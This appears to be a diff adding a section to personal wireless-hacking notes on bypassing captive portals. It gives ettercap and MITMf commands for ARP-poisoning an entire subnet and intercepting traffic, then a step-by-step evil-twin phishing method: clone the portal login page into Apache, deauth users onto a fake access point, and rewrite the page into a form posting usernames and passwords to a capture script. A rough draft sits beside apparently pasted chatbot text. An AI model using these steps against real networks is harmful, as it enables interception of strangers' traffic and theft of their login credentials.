@@ -323,3 +323,262 @@ Once the client reconnects, the hidden SSID will appear in `airodump-ng`, or can
    - Ans:- Just change the MAC address to connected device MAC address.
 
 
+## Bypassing Captive Portals
+
+Captive portals can be bypassed using various methods depending on how they are implemented:
+
+1. Change your MAC address to match that of a connected client.
+2. Use monitor mode to sniff login credentials.
+3. Connect to the network and execute an ARP spoofing attack to capture credentials.
+4. Create a fake access point (AP) and trick users into logging in.
+
+---
+
+### Sniffing Credentials in Monitor Mode
+
+* Captive portals are typically open networks.
+* This means they do **not** use encryption (e.g., WPA/WPA2).
+* Use `airodump-ng` to capture traffic in monitor mode.
+* Then analyze the captured packets using **Wireshark** to extract credentials such as usernames and passwords.
+
+---
+
+### Sniffing Credentials Using ARP Spoofing
+
+* Open networks allow connection without a password.
+* After connecting, a typical ARP spoofing attack can be performed.
+
+Expected behavior:
+
+* Connected clients may lose their session and be prompted to log in again.
+* All data transmitted between clients and the router (including credentials) can be intercepted.
+
+Commands:
+
+``` bash
+sudo ettercap -Tq -M arp:remote -i wlan0 ///
+```
+Each target is placed between two slashes: <br>
+/TARGET1/ /TARGET2/ — intercept traffic between TARGET1 and TARGET2. <br>
+/// — intercept all traffic on the network (no specific targets).
+
+/// it  means:
+
+- No specific targets.
+- ARP poison the entire subnet.
+- Perform a full man-in-the-middle attack on all devices on the LAN.
+
+Or:
+``` bash
+mitmf --arp --spoof -i wlan0 --gateway [gateway]
+
+# For finding gateway: route -n
+```
+
+---
+
+## Difference Between MITMf and Ettercap
+
+Man-in-the-middle (MitM) attacks are a foundational part of network exploitation. Two popular tools used in this domain are **Ettercap** and **MITMf (Man-in-the-Middle Framework)**. Here is a breakdown of how they work and their differences.
+
+---
+
+### 1. Ettercap – The Classic Toolkit
+
+"Swiss Army knife of MitM attacks in local networks"
+
+#### How It Works:
+
+* Performs ARP poisoning by sending forged ARP replies.
+* Captures traffic between victim and gateway.
+* Supports protocol dissection (e.g., FTP, HTTP, Telnet).
+* Can inject scripts into HTTP traffic.
+* Supports writing filters for modifying traffic in real time.
+
+#### Capabilities:
+
+* ARP poisoning (IPv4)
+* DNS spoofing
+* Password sniffing
+* HTTP injection
+* Plugin support
+
+#### Limitations:
+
+* Lacks support for IPv6.
+* Poor compatibility with modern encrypted protocols (HTTPS, HSTS).
+* Some features are unstable on modern systems.
+
+---
+
+### 2. MITMf – A Modern, Modular Framework
+
+Modular, Python-based, and designed for modern attack surfaces.
+
+#### How It Works:
+
+* Built with a modular architecture using Python.
+* Integrates tools and libraries like Scapy, Responder, SSLStrip2, and BeEF.
+* Focuses on extensibility and flexibility.
+
+#### Flexible Attack Vectors:
+
+* ARP and NDP poisoning
+* DNS spoofing
+* SMB/NTLM capture
+* SSLStrip2 for HTTPS downgrade
+* HTML and JavaScript injection
+* BeEF hook injection
+
+#### Modular Usage:
+
+* `--arp` for ARP poisoning
+* `--spoof` for DNS spoofing
+* `--inject` for content injection
+* `--credentials` for credential capture
+
+#### Advanced Capabilities:
+
+* Uses tools like **Responder** and **NTLM-relay** to extract credentials or perform privilege escalation.
+* Supports SSLStrip2 and HSTS bypass when used with DNS spoofing.
+
+---
+
+## Ettercap vs MITMf – Feature Comparison
+
+| Feature              | Ettercap       | MITMf                       |
+| -------------------- | -------------- | --------------------------- |
+| Language             | C              | Python                      |
+| ARP Poisoning        | Yes            | Yes                         |
+| SSLStrip/HSTS Bypass | Limited        | Full (via plugins)          |
+| Plugin System        | Yes (legacy)   | Yes (modular, extensible)   |
+| BeEF Integration     | No             | Yes                         |
+| IPv6 Support         | No             | Yes                         |
+| Maintenance          | Rarely updated | Archived (but still useful) |
+
+---
+
+## Final Thoughts
+
+* **Ettercap** is suitable for simple local attacks on legacy protocols and unencrypted traffic.
+* **MITMf** is a more powerful option, designed for complex environments and supports a wider range of modern exploitation techniques.
+
+---
+
+## Using Social Engineering Techniques
+
+- When everything fails we target the users.
+- Clone the login page used by the captive portal.
+- Create a fake AP with the same/similar name.
+- Deauth users to use the fake network with the cloned page.
+- Sniff the login info!
+
+
+### Cloning the login page
+
+1. First, navigate to the **login page** of the target captive portal.
+
+2. Press **Ctrl + S** to **save the entire page** (including HTML, CSS, and JavaScript files).
+
+   * Make sure to save it as **"Web Page, Complete"** to include all assets.
+
+3. Move the saved files into the Apache web root directory:
+
+   ```bash
+   sudo mv /path/to/saved/page/* /var/www/html/
+   ```
+
+4. Rename the main HTML file to `index.html`:
+
+   ```bash
+   sudo mv /var/www/html/[original_page].html /var/www/html/index.html
+   ```
+
+   * Apache serves `index.html` by default as the landing page.
+
+5. Start the Apache server:
+
+   ```bash
+   sudo service apache2 start
+   ```
+
+6. Open a browser and visit:
+
+   ```
+   http://127.0.0.1
+   ```
+
+   * Confirm the cloned login page is loading properly.
+
+---
+
+
+next steps: modify html code
+
+if href=asset/image so modify it to href=/asset/image 
+2. 
+if your usernameand password not rape with form tag than add form tag menualy cause using form tag it's easy to get username and password. and also check sumbit button
+
+Here's the next section written properly and professionally sequenced, continuing from the previous steps:
+
+---
+
+## Modifying the HTML Code
+
+Once you've saved and moved the captive portal login page into `/var/www/html`, and renamed the main file as `index.html`, you'll need to **edit the HTML** to ensure it works correctly when served locally and can capture user credentials effectively.
+
+### 1. Fix Relative Paths
+
+* In many saved HTML pages, paths to images, stylesheets, or scripts may be written as:
+
+  ```html
+  href="asset/image"
+  ```
+
+* These will **not resolve correctly** unless they're changed to reference the correct root-relative path.
+
+* **Modify them like this:**
+
+  ```html
+  href="/asset/image"
+  ```
+
+* This applies to:
+
+  * `<link href=...>` for stylesheets
+  * `<script src=...>` for JavaScript
+  * `<img src=...>` for images
+
+### 2. Ensure Username and Password Fields Are Inside a `<form>` Tag
+
+* Often, login forms may contain username and password fields (`<input type="text">`, `<input type="password">`) **without being wrapped in a `<form>` tag**, especially in JavaScript-heavy or AJAX-based login pages.
+
+* To capture credentials effectively (e.g., using a PHP script or MITM framework), it's important to wrap these fields inside a standard HTML `<form>` element.
+
+* **Example of a corrected structure:**
+
+  ```html
+  <form action="capture.php" method="POST">
+      <input type="text" name="username" placeholder="Username">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Login</button>
+  </form>
+  ```
+
+* This allows the credentials to be easily submitted to your server-side script for logging or redirection.
+
+### 3. Check the Submit Button
+
+* Make sure the **submit button** inside the form is properly defined:
+
+  ```html
+  <button type="submit">Login</button>
+  ```
+
+  Or:
+
+  ```html
+  <input type="submit" value="Login">
+  ```
+
+* If it's just a `<div>` or `<a>` element styled to look like a button, it won't submit the form unless JavaScript is present. Replace or modify it accordingly.
